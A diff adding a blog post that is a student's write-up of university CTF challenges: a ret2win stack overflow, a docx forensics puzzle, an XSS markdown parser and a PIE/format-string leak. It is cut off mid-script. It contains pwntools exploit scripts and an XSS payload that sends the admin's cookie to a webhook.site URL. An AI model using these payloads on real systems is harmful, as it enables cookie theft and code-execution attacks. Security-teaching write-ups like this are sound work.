@@ -1,0 +1,1991 @@
+---
+title: "Assignment 2 CTF - CS2107 Information Security"
+author: "Yukna"
+pubDate: 2025-04-13
+modDate: 2025-05-11
+description: "Writeup of Assignment 2 CTF challenge for NUS CS2107 Information Security Course"
+heroImage: "../../assets/cs2107-assignment-02/finish.png"
+tags: 
+    - NUS
+    - CS2107
+    - InfoSec
+    - CyberSec
+    - SoftwareBugs
+    - StackSmashing
+    - FmtStr
+    - PathTraversal
+    - Cookies
+    - Canaries
+    - CTF 
+unlist: False
+draft: False
+---
+
+# What is this?
+
+Recently I completed and received the results of my 2nd CTF of National University of Singapore (NUS) CS2107 Information Security course. This assignment particularly focuses on the security aspects of networking, cookies, and proper secure coding. This is my writeup that I had submitted, reformatted for web.
+
+# Preface
+
+This assignment is done in the following steps:
+
+1. SOC VPN using saml-login via openfortinet
+2. virt-manager and qemu/kvm session as a virtual operating system to perform challenges 
+
+    The Guest OS used is a minimal KaliOS setup installed in a centralised qcow2 disk image. For this project, a snapshot/backup is created and the virtual OS is installed with `virt-install` to `qemu:///system` to allow access to hardware virtualisation on nix via libvirt. KaliOS with Xfce Desktop is minimal enough to run well as a guest OS under 8GB ram and 6 cores, and the APT system provides simple installation of tools apart from what is already provided and categorised by the KaliOS team. I also installed [nix's package manager](https://github.com/DeterminateSystems/nix-installer) which allowed me to install my [nixvim setup](https://github.com/yadobler/nixvim-config) - muscle memory is hard to shake off.
+
+3. The writeup is generated with `pandoc writeup.md --toc -s -o name_wu.pdf` with the following *yaml* header:
+
+
+    ```yaml
+    header-includes:
+    - \usepackage{fvextra}
+    - \usepackage{pmboxdraw}
+    - \DefineVerbatimEnvironment{Highlighting}{Verbatim}{breaklines,breaknonspaceingroup,breakanywhere,commandchars=\\\{\}}
+    output:
+      pdf_document: 
+        highlight: tango
+    ```
+# Easy Challenges
+
+## E.1 \[stackoverf]low
+
+Categories: 
+- Application Security
+- Binary Exploitation
+- Pwn
+
+Author: Cao Yitian
+
+Prompt:
+
+
+```text
+What's the difference between hexadecimal and decimal anyway? I don't believe anyone can hack me just because I added "0x" in front of my number. Isn't this a programming problem, not a security problem?
+
+nc cs2107-ctfd-i.comp.nus.edu.sg 5001
+```
+
+Hints:
+1. There is a buffer overflow vunerability within the code - is there perhaps some way to exploit it?
+2. Perhaps there's a function that produces the result you want - is there a way to "jump" to this function?
+3. ou can refer to this guide if you get stuck https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win
+4. The layout of the stack should be variable to overflow (? bytes) + rbp (8 bytes) + rip (to be overwritten), so how many bytes should your padding be?
+
+Attachments:
+- `dist.zip`
+
+### Code
+
+First thoughts: what a funny prompt. Anyways I download the file and extract it. This `C` file (and a binary) is contained in the zip file, unnecessary parts omitted for brevity:
+
+
+```c
+// omitted
+
+// REDACTED!!! You will never find my secret! **Randomly generated per run
+char* secret = "[REDACTED]";
+
+// omitted
+
+// You want to reach this function!
+int win() {
+    char* argv[3] = {"/bin/cat", "flag.txt", NULL};
+    printf("Good job!\n");
+    execve("/bin/cat", argv, NULL);
+    exit(0);
+}
+
+int main() {
+    setup();
+    // Define buffer
+    char buf[128];
+
+    // Print welcome message
+    printf("Welcome to the stack!\n");
+    printf("We have all sorts of goodies here, only for the eyes of authorized users :)\n");
+    printf("Please enter your secret identity key:\n");
+
+    // Read user input
+    fgets(buf, 0x128, stdin);
+
+    // Verify user input with secret
+    if (!strcmp(secret, buf)) { // If user input matches secret, print flag
+        win();
+    }
+
+    // If no match at all, print access denied message >:(
+    printf("Access denied! Why are you trying to access my system?? >:(\n");
+}
+```
+
+#### First Thoughts
+
+**Note 128 vs 0x128**:
+
+
+```C
+    // Define buffer
+    char buf[128];
+    // ...
+    // Read user input
+    fgets(buf, 0x128, stdin);
+```
+
+Ok this makes sense. It is the classic [return to win](https://yadobler.github.io/blog/2024-11-26-huntress_ctf/baby_buffer_overflow/) overflow! We can quickly break apart and look at the binary that is being used in the server. In modern systems when compiling, `gcc` usually includes *stack canaries* that acts as a padded "overflow" safezone, and if breached, signals that an overflow as occured (either software - *I have been unfortunate to receive the `stack smashing detected` spam on my terminal* - or hardware with memory frame flag bits).
+
+
+KaliOS unfortunately comes with only `radare2` for reverse engineering, but I am a binary-ninja kinda person. I install binja, and am greeted with the familiar sight of freeware:
+
+![binja welcome screen](@assets/cs2107-assignment-02/E.1/01.png)
+
+I open the `chall` binary file and go to main:
+
+![chall main](@assets/cs2107-assignment-02/E.1/02.png)
+
+### Disassembly
+
+There are two number to take note of:
+1. The address of `win()`: this is at address `0x00401209`
+2. The address of the buffer that stores what we enter. 
+    For this, we look at where `&buf` really is. Binja tells us it's at stack offset `-0x88`:
+
+    ![stack offset](@assets/cs2107-assignment-02/E.1/03.png)
+
+The number here is `0x88` from the start of the stack allocated to `main()`. The first 8 bytes (since we are in 64-bit addressing) is the old base pointer value of the previous function's stack, while below this is usually some padding (if stack guard is set), or else immediately it is the return address that will be loaded into the instruction pointer register `rip` and the instruction at `rip` will be executed. We will **target this return address before the stack**, by changing it to the address of our `win()` function instead, so that when `main()` returns, it actually goes to `win()` instad of the standard post-main cleanup.
+
+If we change *High Level Intermediate Language (IL)* to *Disassembly*, we can look at how the registers are set up for this:
+
+
+```text
+00401267  f30f1efa           endbr64 
+0040126b  55                 push    rbp {__saved_rbp}
+0040126c  4889e5             mov     rbp, rsp {__saved_rbp}
+0040126f  4883c480           add     rsp, 0xffffffffffffff80
+...
+004012b1  488d4580           lea     rax, [rbp-0x80 {buf}]
+004012b5  be28010000         mov     esi, 0x128
+004012ba  4889c7             mov     rdi, rax {buf}
+004012bd  e8eefdffff         call    fgets
+```
+
+This shows:
+1. how the `main()` function is set up:
+    1. the previous `rbp` (register of pointer to base of stack) is pushed under the stack (growing downwards)
+    2. `rbp` is now set to point to where the `rsp` (register in stack) is currently pointing to (`0x8` bytes from `main()`'s stack) 
+    3. `rsp` is incremented by `0xffffffffffffff80`, which is `-0x80` (-128).
+        This is how it looks in memory:
+
+
+        ```text
+
+               +----------+  
+        -0x00  | old rbp  | 
+               +-        -+
+        -0x01  | old rbp  |
+               +-        -+
+        -0x02  | old rbp  |
+               +-        -+
+        -0x03  | old rbp  |
+               +-        -+
+        -0x04  | old rbp  |
+               +-        -+
+        -0x05  | old rbp  |
+               +-        -+
+        -0x06  | old rbp  |
+               +-        -+
+        -0x07  | old rbp  |
+               +----------+ 
+        -0x08  |          | <- rbp
+               +----------+ 
+                 .......       
+               +----------+
+        -0x88  |          | 
+               +----------+ <- rsp
+        ```
+
+2. how the registers are set before the `fgets` function is called:
+    1. the address of `rbp-0x80` is loaded into `rax`
+    2. the number of characters, `0x128`, is loaded to `esi`
+    3. the address of `rbp-0x80` (that is already in `rax`) is now in `rdi`
+    4. This shows the memory setup:
+
+
+        ```text
+                       +----------+  
+            /    0xA0  |  ??????  | <- where we can write till
+            |          +----------+  
+            |               ...
+            |          +----------+ 
+            |    0x08  | ret addr | \
+            |          +-        -+ |
+            |    0x07  | ret addr | |
+            |          +-        -+ |
+            |    0x06  | ret addr | |
+            |          +-        -+ | our target
+            |    0x05  | ret addr | |
+            |          +-        -+ |
+            |    0x04  | ret addr | |
+            |          +-        -+ |
+            |    0x03  | ret addr | |
+            |          +-        -+ |
+            |    0x02  | ret addr | |
+            |          +-        -+ |
+            |    0x01  | ret addr | /
+          0 |          +----------+ 
+          x |   -0x00  | old rbp  | 
+          1 |          +-        -+
+          2 |   -0x01  | old rbp  |
+          8 |          +-        -+
+            |   -0x02  | old rbp  |
+          b |          +-        -+
+          y |   -0x03  | old rbp  |
+          t |          +-        -+
+          e |   -0x04  | old rbp  |
+          s |          +-        -+
+            |   -0x05  | old rbp  |
+            |          +-        -+
+            |   -0x06  | old rbp  |
+            |          +-        -+
+            |   -0x07  | old rbp  |
+            |          +----------+ 
+            |   -0x08  |          | <- rbp  Where fgets should stop 
+            |          +----------+         if `128` is passed instead of `0x128`
+            |            .......       
+            |          +----------+
+            \   -0x88  |          | 
+                       +----------+ <- rdi  Start writing input from here, upwards
+        ```
+
+We can try this simple payload:
+
+### Payload
+
+```py 
+from pwn import *
+
+target_function_address = 0x00000000_00401209  # Address of target function
+
+# Construct the payload
+payload = b'A' * 128 + b'B' * 8 + p64(target_function_address)
+
+# Connect to the remote service
+p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5001)
+
+# Send the payload
+p.sendline(payload)
+
+# Drop into interactive mode to access the shell
+p.interactive()
+```
+
+I drop to interactive mode because I am lazy to try and read all. :tired:
+
+### Results
+
+Here is the result!
+
+```text
+$ python ./script.py   
+[x] Opening connection to cs2107-ctfd-i.comp.nus.edu.sg on po[|] Opening connection to cs2107-ctfd-i.comp.nus.edu.sg on port 5Opening connection to cs2107-ctfd-i.comp.nus.edu.sg on po[+] 001: Done
+[*] Switching to interactive mode
+Welcome to the stack!
+We have all sorts of goodies here, only for the eyes of authorized users :)
+Please enter your secret identity key:
+Access denied! Why are you trying to access my system?? >:(
+Good job!
+CS2107{b4by_s_f1r57_ret2win:)}[*] Got EOF while reading in interactive
+```
+
+
+Key: `CS2107{b4by_s_f1r57_ret2win:)}`
+
+## E.2 dot doc dox
+
+Categories: 
+- Forensics Analysis
+
+Author: Jonathan Loh
+
+Prompt:
+
+
+```text
+A little bird told me one of the TAs said they hid some information in the assignment docx so the students wouldn't notice...
+```
+
+Hints: None
+
+Attachments:
+- `AY2425-S2-CS2107_Assignment_1_PDF.docx`
+
+### CyberChef
+
+It's [CyberChef](https://gchq.github.io/CyberChef/) time. If the single file has something hidden, it's either `binwalk` or `CyberChef`. I choose the latter.
+
+To begin, I do a file detect. I can't really open `docx` on linux so I do not know what I am looking at. Here is what CyberChef tells me with *Detect File Type*:
+```
+File type:   Microsoft Office 2007+ document
+Extension:   docx,xlsx,pptx
+MIME type:   application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation
+
+File type:   PKZIP archive
+Extension:   zip
+MIME type:   application/zip
+```
+
+Anyways I unzip and I see the raw xmls of this docx file. I immediately do a recursive grep, using my favourite alternative [ripgrep](https://github.com/BurntSushi/ripgrep). Trying for `rg 'CS2107\{...' -i --only-matching` (the `-i` flag enables case-insensitivity, while `--only-matching` only returns the match and not the whole line, which in the case of these tightly packed xml files, is the entire file) yields only one result: 
+
+
+```text
+$ rg 'cs2107\{...' -i --only-matching 
+word/document.xml
+1:CS2107{}</
+```
+
+### Second Layer
+
+This is the example of the original assignment file, describing the format of the flag. I am dumbfounded. It probably is not a text file, so I do `tree`:
+
+
+```text 
+$ tree
+.
+├── AY2425-S2-CS2107_Assignment_1_PDF.docx
+├── [Content_Types].xml
+├── docProps
+│   ├── app.xml
+│   ├── core.xml
+│   └── custom.xml
+├── _rels
+└── word
+    ├── comments.xml
+    ├── document.xml
+    ├── fontTable.xml
+    ├── footnotes.xml
+    ├── metadata.docx
+    ├── numbering.xml
+    ├── _rels
+    │   ├── document.xml.rels
+    │   └── footnotes.xml.rels
+    ├── settings.xml
+    ├── styles.xml
+    ├── theme
+    │   └── theme1.xml
+    └── webSettings.xml
+```
+
+Then I spot it - `metadata.docx` - indeed another non-text file!
+
+I immediately unzip that and ripgrep-ed the resulting files:
+
+
+```text
+$ rg 'cs2107\{...' -i --only-matching
+document.xml
+1:CS2107{}</
+
+word/document.xml
+2:CS2107{l_d
+2:CS2107{}</
+```
+
+That's the flag! I refined the regex (no not with a billion `.`s) with a little known ungreedy wildcard. using `[^}]+` will search until the next `}`, which is good to prevent greedy matching until the final `}` of the sentence, which might not be what you want.
+
+### Results
+
+```text
+$ rg 'cs2107\{[^}]+}' -i --only-matching
+word/document.xml
+2:CS2107{l_d1Dnt_know_docx_f1l3s_w3Re_js_zi1lIpsSs???}
+```
+
+
+Key: `CS2107{l_d1Dnt_know_docx_f1l3s_w3Re_js_zi1lIpsSs???}`
+
+## E.3 Markdown Parser
+
+Categories: 
+- Web Security
+
+Author: River Koh
+
+Prompt:
+
+
+```text
+I built this simple markdown parser. Please give me some feedback (in markdown), I promise to read them all.
+
+(Access the link in your browser)
+
+* If you're testing locally, the submit feedback button will not work. Submission of feedback will only work on remote.
+
+http://cs2107-ctfd-i.comp.nus.edu.sg:5004
+```
+
+Hints: None
+
+Attachments:
+- `dist.zip`
+
+### Recee
+
+Ah, such a conspicuously innocent looking markdown renderer...
+
+![md renderer](@assets/cs2107-assignment-02/E.3/01.png)
+
+Rendering the markdown yields a button to provide feedback too:
+
+![rendered md](@assets/cs2107-assignment-02/E.3/02.png)
+
+Clicking it yields an alert box after a few seconds:
+
+![alert box](@assets/cs2107-assignment-02/E.3/03.png)
+
+Peeking into the developer console shows that clicking this results in request to `/feedback/` with the url that is generated when rendering the markdown:
+
+![dev console](@assets/cs2107-assignment-02/E.3/04.png)
+
+Looking at the source code of the first page shows how this url is generated:
+
+
+```html
+<form id="markdownForm">
+    <textarea id="markdownInput" placeholder="Enter your markdown here"></textarea>
+    <button type="submit">Submit</button>
+</form>
+<script>
+document.getElementById('markdownForm').addEventListener('submit', function (event) {
+    event.preventDefault();
+    const input = document.getElementById('markdownInput').value;
+    const encodedInput = btoa(input);
+    window.location.href = '/parse-markdown?markdown=' + encodeURIComponent(encodedInput);
+});
+</script>
+```
+
+The input is first encoded with `btoa` which encodes the string in base64, and then encodes it to make it URL-safe.
+
+Looking at the server code, I am intrigued by the `admin.js` file:
+
+
+```js
+const visitUrl = async (url, cookieDomain) => {
+    // omitted
+    try {
+        const page = await browser.newPage()
+
+        try {
+            await page.setCookie({
+                name: 'flag',
+                value: process.env.FLAG || 'cs2107{fake_flag}',
+                domain: cookieDomain,
+                httpOnly: false,
+                samesite: 'strict'
+            })
+            await page.goto(url, { timeout: 6000, waitUntil: 'networkidle2' })
+        } finally {
+            await page.close()
+            await browser.close()
+        }
+    }
+    finally {
+        browser.close()
+    }
+}
+    // omitted
+```
+
+This means that the *admin* sets a cookie in its private web browser, then visits the url that we submit, before closing. The `httpOnly: false` property means there is a chance of attack via XSS (cross-site scripting). The javascript running in the wrbpage of the url visited by the server's *admin* can read the cookie. We will revisit this in a bit.
+
+### Exploit
+
+In `index.js`, we catch a glimpse of what is done with the markdown:
+
+
+```js
+        const markdown = atob(base64Markdown);
+        const html = parseMarkdown(markdown);
+        res.render('view', { content: html });
+```
+
+The markdown is directly interpreted as html. How *dangerous* hmhm. Let's try a little experiment. I will try to input this as a *markdown script* to be *rendered*:
+```
+<script>alert(1)</script>
+```
+
+I click *Render* and:
+
+![alert1](@assets/cs2107-assignment-02/E.3/05.png)
+
+### Plan
+
+It works..... That means we have found:
+- A way to run javascript on the server 
+- A way to read cookies on the server via javascript
+
+Now the only thing is how to transmit this cookie back.
+
+This took me a lot of time to think about, and I even had to consult our dearest ChatGPT on what I can do to transmit cookies. After a few failed attempts, and unwillingness to forward my port, ChatGPT suddenly said, "How 'bout webhook.site ??". Wow. So this site gives a unique url and reports on any connections made.
+
+### Payload
+
+So I crafted this payload as my *markdown file* to be rendered
+
+
+```html
+<script>
+new Image().src = "https://webhook.site/<UNIQUE-URL-HERE>?cookie=" + encodeURIComponent(document.cookie);
+</script>
+```
+
+This tries to *load* an image with that url, but the url itself contains the information to be given. It is a bit like the 80s *collect call* where you could ping someone to call you, and you said your name, and if the receiver did not want to accept the call (and bare the cost) they would hang up.
+
+https://www.youtube.com/watch?v=V04bh-G4-qU
+
+### Results
+
+I clicked rendered and hopped onto the webhook site. A `GET` rrsponse was initiated to: `https://webhook.site/<URL>?cookie=`. blank. 
+
+I stared at the computer screen. Almost defeated. Then I realised I have not clicked the *feedback* button. It was my own browser that initiated that request, and I do not have any cookie. So i clicked, and:
+```
+https://webhook.site/<UNIQUE-URL-HERE>?cookie=flag%3DCS2107%7Bch4ll3ng3_mark3d_c0mp1et3d%7D
+```
+
+The site shows the query strings decoded as well, and it was a pleasure knowing this site. It will now be in my arsenal. 
+
+Key: `CS2107{ch4ll3ng3_mark3d_c0mp1et3d}`
+
+# Medium Challenges
+
+## M.1 slice of pie
+
+Categories: 
+- Application Security 
+- Binary Exploitation 
+- Pwn
+
+Author: Cao Yitian
+
+Prompt:
+
+
+```text
+Hello hello, welcome to my PIE shop. Last time I gave out a slice of PIE, someone hacked into my systems! Surely this time there's no way for someone to obtain the PIE anymore...
+
+You may want to use GDB to dynamically analyse the binary. Do refer to the guides/resources provided in your assignment PDF (under "Resources you may find helpful").
+
+nc cs2107-ctfd-i.comp.nus.edu.sg 5002
+```
+
+Hints:
+1. This is a buffer overflow challenge, with PIE enabled (Position Independent Executable) and a fmtstr vulnerability. PIE is a random offset that is generated on runtime and added to all relative offset memory addresses. The generated PIE value remains constant for the same instance of the application. If you could somehow leak a runtime memory address value, could you perhaps obtain the generated PIE value?
+2. There is a wild fmtstr vulnerability in the code, are you able to use it to leak any address? If you have leaked an address, is there a way to calculate the PIE?
+3. If you're stuck on the fmtstr, try leaking the 9th pointer value on the stack ("%x$y", where x and y are replaced by the nth value and the type of value rrspectively)
+4. The exploit chain should end similarly to ret2win (which you did in the easy challenge). Here are some supplementary guides on [PIE](https://ir0nstone.gitbook.io/notes/binexp/stack/pie/pie-exploit) and [fmtstr](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) to aid you in completing your exploit chain
+5. There is an offset from the leaked address to the start of the menu(), then another offset from menu() to the win()
+
+Attachments:
+- `dist.zip`
+
+### Code
+
+Reading the description and hints, it is similar to [the stackoverflow E.1 challenge](#e1-stackoverflow). However, now there is **position independent code** addressing (PIE). Let's first see the code:
+
+
+```c 
+// omitted for brevity
+
+int win() {
+    char* argv[3] = {"/bin/cat", "flag.txt", NULL};
+    printf("Good job!\n");
+    execve("/bin/cat", argv, NULL);
+}
+
+int viewingredients() {
+    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
+    printf("Ingredients for our signature Lemon Blueberry Tart\n\n");
+    printf("Sauce:\n");
+    printf("1 teaspoon cornstarch\n");
+    printf("2 teaspoons lemon juice (or water)\n");
+    printf("1 cup (140g) fresh or frozen blueberries (do not thaw)\n");
+    printf("2 teaspoons granulated sugar\n\n");
+    printf("Shortbread Crust:\n");
+    printf("1/2 cup (8 Tbsp; 113g) unsalted butter, melted\n");
+    printf("1/4 cup (50g) granulated sugar\n");
+    printf("1 teaspoon pure vanilla extract\n");
+    printf("1/4 teaspoon salt\n");
+    printf("1 cup (125g) all-purpose flour (spooned & leveled)\n");
+    printf("Filling:\n\n");
+    printf("1 (14 ounce weight) can full-fat sweetened condensed milk\n");
+    printf("6 Tablrspoons (90ml) lemon juice (about 2 lemons)\n");
+    printf("1 teaspoon lemon zest (1 lemon)\n");
+    printf("1 large egg yolk\n\n");
+    printf("Press ENTER to return to menu.\n");
+    getchar();
+}
+
+int search() {
+    char input[0x10];
+
+    printf("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
+    printf("Welcome to catalog search!\n");
+    printf("Please use this to view our ingredients catalog.\n\n");
+    printf("Please enter your search term:\n");
+    fgets(input, 0x10, stdin);
+    printf("Nothing found on your search term: ");
+    printf(input);
+    printf("\n\nPress ENTER to return to menu.\n");
+    getchar();
+}
+
+int bake() {
+    char input[0x30];
+
+    printf("\n\n");
+    printf("Input to bake your pie: ");
+    gets(input);
+    printf("\nBaking pie...\n\n");
+    printf("Your pie has been baked. Please proceed to the factory to collect it :)\n\n");
+}
+
+int menu() {
+    char input[4];
+
+    while(1) {
+        printf("\n\n\n\n\n\n\n\n\n");
+        printf("\033[1;36m");
+        printf("=====================\n");
+        printf("|                   |\n");
+        printf("|     PIE MAKER     |\n");
+        printf("|       31415       |\n");
+        printf("|                   |\n");
+        printf("=====================\n\n");
+        printf("\033[0;36m");
+        printf("1. View Required Ingredients\n");
+        printf("2. Search Catalog\n");
+        printf("3. Bake Pie\n");
+
+        printf("\nOption: ");
+        fgets(input, 4, stdin);
+        switch(atoi(input)) {
+            case 1:
+                viewingredients();
+                break;
+            case 2:
+                search();
+                break;
+            case 3:
+                bake();
+                break;
+            default:
+                printf("Invalid choice!\n");
+                sleep(1.5);
+                continue;
+        }
+    }
+}
+
+int main() {
+    setup();
+    menu();
+}
+```
+
+### Vulnerabilities
+
+I wonder if the recipe works. I see a few positions for input:
+1. `main()`: Buffer of `char input[4];` fed in by `fgets(input, 4, stdin);`.
+1. `bake()`: Buffer of `char input[0x30];` fed in by `gets(input)`.
+1. `search()`: Buffer of `char input[0x10];` fed in by `fgets(input, 0x10, stdin);`.
+
+My suspicion is the `bake`, and randomly spamming an input to `gets` larger than `0x30` bytes causes a segmentation fault after the function ends:
+![bake](@assets/cs2107-assignment-02/M.1/01.png)
+
+Another area of attack is this *unsanitized* input being printed in the `search()` method:
+
+
+```c
+    printf("Please enter your search term:\n");
+    fgets(input, 0x10, stdin);
+    printf("Nothing found on your search term: ");
+    printf(input);
+    printf("\n\nPress ENTER to return to menu.\n");
+```
+
+The issue here is that the `printf` performs a string format (`fmtstr`) before printing, without sanitising or escaping the string given by the input. The *gold standard* for `printf` non-constant (known at runtime) string sanitising is `printf("%s", input)` which will escape all percentages, hence treating an input like `%d` (print signed number number from stack) as `%%` (literal percentage sign) and `d`. 
+
+A code like this:
+
+
+```c 
+    int i = 0xFEFE;
+    int j = 0x6969;
+    printf("%d %d", i, j);
+```
+
+yields an assembly code of:
+
+*from [godbolt online compiler](https://godbolt.org/) with `gcc` compile flag options `-fno-stack-protector -z execstack`)*
+
+
+```nasm
+.LC0:
+        .string "%d"
+main:
+        push    rbp                         ; save $rbp as old_$rbp in stack.
+        mov     rbp, rsp                    ; make $rbp point to where old_$rbp was saved.
+        sub     rsp, 16                     ; make space for 8 bytes on stack
+                                            ;   (8 extra bytes to skip over saved old_$rbp).
+
+        mov     DWORD PTR -4[rbp], 0xFEFE   ; store 0xFEFE to first 4 bytes of stack frame.
+        mov     DWORD PTR -8[rbp], 0x6969   ; store 0x6969 to next 4 bytes in stack frame.
+        
+        mov     edx, DWORD PTR -8[rbp]      ; store pointer to 3nd argument (j) into $edx.
+        mov     eax, DWORD PTR -4[rbp]      ; store pointer to 2st argument (i)into $esi
+        mov     esi, eax                
+
+        mov     edi, .LC0[rip]              ; store pointer of 1st argument (string) into $edi
+
+        mov     eax, 0                      ; set eax to 0 for printf.
+        call    printf                      ; call function printf.
+        
+        mov     eax, 0                      ; end of main function cleanup.
+        leave
+        ret
+```
+
+### Understanding `printf`
+
+From [this resource](http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html) we can see that:
+
+(I shifted the ordinals down one, so that argument 0 refers to the main string and arguments 1 onwards align with the passed in parameters of `printf`)
+
+| **Register** | **Purpose** | **Saved across calls** |
+|---|---|---|
+| %rax      | temp register; return value                   | No       |
+| %rbx      | callee-saved                                  | Yes      |
+| %rbp      | callee-saved; base pointer                    | Yes      |
+| %rsp      | stack pointer                                 | Yes      |
+| %rdi      | used to pass 0th argument to functions        | No       |
+| %rsi      | used to pass 1st argument to functions        | No       |
+| %rdx      | used to pass 2nd argument to functions        | No       |
+| %rcx      | used to pass 3rd argument to functions        | No       |
+| %r8       | used to pass 4th argument to functions        | No       |
+| %r9       | used to pass 5th argument to functions        | No       |
+
+What is interesting is that nothing tells `printf` if we did or did not set registers. Moreover, the registers are normally not cleared out beforehand either. So, it can be garbage or any previously set data, and `printf` will not know this. We can leak any value of register `$rsi`, `$rdx`,`$rcx`,`$r8`, and `$r9` with `%p` or the value pointed by them with `%d` (or anything similar, like `%s`). 
+
+Looking at the disassembly of `search()`, we can tell there is nothing setting these registers, except at `00001453` where `$esi` is set to `0x10` 
+
+
+```nasm 
+00001448  488b15d12b0000     mov     rdx, qword [rel stdin]
+0000144f  488d45f0           lea     rax, [rbp-0x10 {var_18}]
+00001453  be10000000         mov     esi, 0x10
+00001458  4889c7             mov     rdi, rax {var_18}
+0000145b  e8a0fcffff         call    fgets
+```
+
+In fact, this is true for the `menu` section, where only `$esi` is set. This means **any other function that sets the other 4 registers without clearing them will persist**! (but in this case it does not help much...)
+
+### Dynamic Analysis
+
+We can dynamically run `GDB` to see what registers are at what value (and pointing to which data) if we locally run this *PIE* executable.
+
+1. run `gdb --tui ./pie`
+1. set a breakpoint at `menu`: `b menu`
+1. set the tui layout to show assembly code: `tui layout asm` 
+1. Run with `r` and step next instruction with `ni` until prompted to enter the option, and type `2` for the search. Use Ctrl+L to refresh the screen if it messes up.
+1. Step next until inside the `search` function instruction frame.
+1. Arrow down and find where the instruction to call the vulnerable `printf` is. 
+1. Break with `b *search+128` (since *GDB* tells me it's line `search+128`)
+1. Continue with `c` to reach this line.
+1. Add registers to the layout with `tui layout reg` and scroll through to see the register states.
+
+![gdb](@assets/cs2107-assignment-02/M.1/02.png)
+
+I got these: 
+| **Register** | **Value** | **Notes** |
+|---|---|---|
+| %rax      | 0x0000000000000000 | set to 0 |
+| %rbx      | 0X7FFFFFFFFFFFDC38 | ignored | 
+| %rbp      | 0X7FFFFFFFFFFFDAF0 | base of stack | 
+| %rsp      | 0X7FFFFFFFFFFFDAE0 | stack pointer, $rbp-0x10 | 
+| %rdi      | 0X7FFFFFFFFFFFDAE0 | pointer to our malicious input string | 
+| %rsi      | 0X7FFFFFFFFFFFD930 | 1st argument, rbp-448 | 
+| %rdx      | 0X0000000000000000 | 2nd argument | 
+| %rcx      | 0X0000000000000000 | 3rd argument | 
+| %r8       | 0X0000000000000001 | 4th argument | 
+| %r9       | 0X0000000000000000 | 5th argument | 
+                                   
+
+Unfortunately there is nothing in the registers for arguments 1 to 5 that we can use. Beyond these, pointers to further arguments are retrieved from the stack consequtively - a slower and space wasting process than having the addresses already loaded to registers, but needed for the exceptional cases of too many arguments. We now have a way to **leak the stack**. Our target will be the saved return address:
+
+
+```text
+            +----------+ 
+      0x08  | ret addr | \
+            +-        -+ |
+      0x07  | ret addr | |
+            +-        -+ |
+      0x06  | ret addr | |
+            +-        -+ | our target
+      0x05  | ret addr | | "argument 9"
+            +-        -+ |
+      0x04  | ret addr | |
+            +-        -+ |
+      0x03  | ret addr | |
+            +-        -+ |
+      0x02  | ret addr | |
+            +-        -+ |
+      0x01  | ret addr | /
+            +----------+ 
+     -0x00  | old rbp  | \ 
+            +-        -+ |
+     -0x01  | old rbp  | |
+            +-        -+ |
+     -0x02  | old rbp  | |
+            +-        -+ |
+     -0x03  | old rbp  | |
+            +-        -+ |
+     -0x04  | old rbp  | | "argument 8"
+            +-        -+ |
+     -0x05  | old rbp  | |
+            +-        -+ |
+     -0x06  | old rbp  | |
+            +-        -+ |
+     -0x07  | old rbp  | |
+            +----------+ /
+     -0x08  |  arg  7  | <- rbp  
+            +-        -+
+              ........
+            +-        -+
+     -0x0F  |  arg  7  |
+            +----------+
+     -0x10  |  arg  6  |
+            +-        -+
+              ........
+            +-        -+
+     -0x17  |  arg  6  | 
+            +----------+ 
+     -0x18  |          | <- rdi (also arg0)
+            +----------+ 
+```
+
+
+Given the character limit of the input buffer of 0x10 (16), each argument takes 2 characters and the null byte at the end will take one, so only a maximum of 7 `%p` can be spammed. So we cannot get our *9th* argument
+
+### Secrets of `printf`
+
+However, there is a very sneaky little part in the manual for using `printf` in section 3 (*Library functions*) accessible by `man 3 printf`:
+
+
+```man 
+   The overall syntax of a conversion specification is:
+
+       %[$][flags][width][.precision][length modifier]conversion
+
+   The arguments must corrrspond properly (after type promotion) with the conversion specifier.  By  default,  the  argu‐
+   ments  are used in the order given, where each '*' (see Field width and Precision below) and each conversion specifier
+   asks for the next argument (and it is an error if insufficiently many arguments are given).  One can also specify  ex‐
+   plicitly  which  argument  is  taken, at each place where an argument is required, by writing "%m$" instead of '%' and
+   "*m$" instead of '*', where the decimal integer m denotes the position in the argument list of the  desired  argument,
+   indexed starting from 1.  Thus,
+
+       printf("%*d", width, num);
+
+   and
+
+       printf("%2$*1$d", width, num);
+
+   are  equivalent.  The second style allows repeated references to the same argument.  The C99 standard does not include
+   the style using '$', which comes from the Single UNIX Specification.  If the style using '$' is used, it must be  used
+   throughout for all conversions taking an argument and all width and precision arguments, but it may be mixed with "%%"
+   formats,  which do not consume an argument.  There may be no gaps in the numbers of arguments specified using '$'; for
+   example, if arguments 1 and 3 are specified, argument 2 must also be specified somewhere in the format string.
+```
+
+Importantly, this part here:
+
+> One can also specify  explicitly  which  argument  is  taken, at each place where an argument is required, by writing `%m$` instead of `%` and `*m$` instead of `*`, where the decimal integer m denotes the **position in the argument list** of the  desired  argument, indexed starting from 1.
+
+This means we can use `%9$p` to get the pointer value of argument *9*, which is the return address to `menu()`. We know from our disassembled binary that the line `000014fd    void menu() __noreturn` indicates `menu()` is at **relative** position `0x14FD`. `win()` is at `0x127C`. So if we get the address, we must adjust it by adding `-0x14FD + 0x127C` 
+
+Or is it? hmhm
+
+I made a mistake! `search()` is not returning back to the start of `menu()`!! It's returning back to where it left off after being called, so that will be this line:
+
+
+```nasm
+00001626  e8d5fdffff         call    search
+0000162b  eb26               jmp     0x1653
+```
+
+So the correct value to subtract is `0x162B`
+
+### Payload
+
+```py 
+from pwn import *
+
+target_function_address = 0 # Unknown address of target function
+
+# Connect to the remote service
+p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5002)
+
+# go to search function
+p.recvuntil(b"Option: ")
+p.sendline(b"2")
+
+# enter our spicy pie ingredient
+p.recvuntil(b"Please enter your search term:\n")
+p.sendline(b"%9$p")
+
+p.recvuntil(b"Nothing found on your search term: ")
+address_gotten = p.recvline().decode("utf-8").strip()
+target_function_address = int(address_gotten,0) - 0x162B + 0x127C
+print(f"Gotten: {address_gotten}, calculated address: {hex(target_function_address)}")
+
